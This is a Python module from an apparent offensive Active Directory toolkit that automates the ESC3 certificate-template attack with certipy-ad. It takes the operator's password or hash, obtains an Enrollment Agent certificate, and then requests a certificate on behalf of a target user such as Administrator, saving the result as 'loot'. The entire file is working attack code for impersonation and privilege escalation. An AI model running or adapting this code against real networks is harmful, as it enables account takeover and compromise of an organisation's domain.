import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc3(session, agent_template):
    print(blue("[>] ESC3: Exploiting Enrollment Agent template to request certificate on behalf of another user."))
    print(yellow("[*] This allows you to enroll as an agent, then impersonate another user via 'on-behalf-of' abuse."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(yellow("[!] No CA info found in session. Using fallback value 'UNKNOWN-CA'."))
        ca_name = "UNKNOWN-CA"
    else:
        ca_name = cas[0].get("name", "").strip()
        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
            print(yellow("[!] CA name invalid or missing. Using fallback value 'UNKNOWN-CA'."))
            ca_name = "UNKNOWN-CA"

    # Build authentication part
    if session.hash:
        auth = ["-u", f"{session.username}@{session.domain}", "-hashes", session.hash]
    elif session.password:
        auth = ["-u", f"{session.username}@{session.domain}", "-p", session.password]
    else:
        print(red("[-] No credentials provided (password or hash)."))
        return

    # Step 1: Request Enrollment Agent certificate
    agent_out = "agent_cert.pfx"
    enroll_cmd = [
        "certipy-ad", "req",
        *auth,
        "-dc-ip", session.dc_ip,
        "-template", agent_template,
        "-ca", ca_name,
        "-out", agent_out
    ]

    print(blue(f"[*] Step 1: Requesting Enrollment Agent cert using template '{agent_template}'..."))
    enroll_str = " ".join(enroll_cmd)
    output1, err1 = run_command(enroll_str)
    print(output1.strip() or err1.strip())

    if not os.path.exists(agent_out) or os.path.getsize(agent_out) < 100:
        print(red("[-] Enrollment Agent certificate not created."))
        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))
        print(yellow(f"[*] Command executed: {enroll_str}"))
        return

    print(green(f"[+] Agent certificate saved to: {agent_out}"))

    # Step 2: Abuse Enrollment Agent to request on behalf of another user
    target_user = input("[?] Enter target user to impersonate (e.g., LAB\\Administrator): ").strip()
    second_out = "esc3_onbehalf.pfx"
    abuse_cmd = [
        "certipy-ad", "req",
        *auth,
        "-dc-ip", session.dc_ip,
        "-template", "User",
        "-ca", ca_name,
        "-on-behalf-of", target_user,
        "-pfx", agent_out,
        "-out", second_out
    ]

    print(blue(f"[*] Step 2: Requesting cert on behalf of '{target_user}'..."))
    abuse_str = " ".join(abuse_cmd)
    output2, err2 = run_command(abuse_str)
    print(output2.strip() or err2.strip())

    if os.path.exists(second_out) and os.path.getsize(second_out) > 100:
        with open(second_out, "rb") as f:
            binary_data = f.read()
        save_loot(os.path.basename(second_out), binary_data, binary=True)
        print(green(f"[+] On-behalf-of certificate saved to: {second_out}"))
    else:
        print(red("[-] On-behalf-of certificate not created."))
        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))

    print(yellow(f"[*] Step 1 command executed: {enroll_str}"))
    print(yellow(f"[*] Step 2 command executed: {abuse_str}"))
